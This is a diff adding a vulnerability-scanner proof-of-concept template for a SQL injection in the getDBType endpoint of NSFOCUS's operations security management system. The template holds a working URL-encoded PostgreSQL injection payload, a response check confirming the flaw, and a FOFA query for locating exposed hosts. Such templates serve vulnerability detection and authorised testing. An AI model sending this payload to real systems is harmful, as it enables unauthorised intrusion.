@@ -1,0 +1,16 @@
+id: poc-yaml-nsfocus-osms-getdbtype-sqli
+info:
+  name: 绿盟运维安全管理系统 getDBType SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 绿盟运维安全管理系统
+  fofa: body="'/needUsbkey.php?username='"
+requests:
+- method: GET
+  path: /webconf/log/getDBType?cat=espc&sid=7473a85e535405e7bd991cb82b2f134c&sql=(SELECT+(CHR(113)%7C%7CCHR(122)%7C%7CCHR(122)%7C%7CCHR(107)%7C%7CCHR(113))%7C%7C(SELECT+(CASE+WHEN+(3788%3D3788)+THEN+1+ELSE+0+END))%3A%3Atext%7C%7C(CHR(113)%7C%7CCHR(112)%7C%7CCHR(112)%7C%7CCHR(113)%7C%7CCHR(113)%7C%7CCHR(112)%7C%7CCHR(112)%7C%7CCHR(113)%7C%7CCHR(113)))
+  expression: status_code == 200 && contains(body,"<dbtype>qzzkq1qppqqppqq</dbtype>")
+    && contains(body,"?xml") && !contains(body,"<html") && contains(headers,"Server\x3a
+    NSFOCUS")
+variables: {}
+transport: http
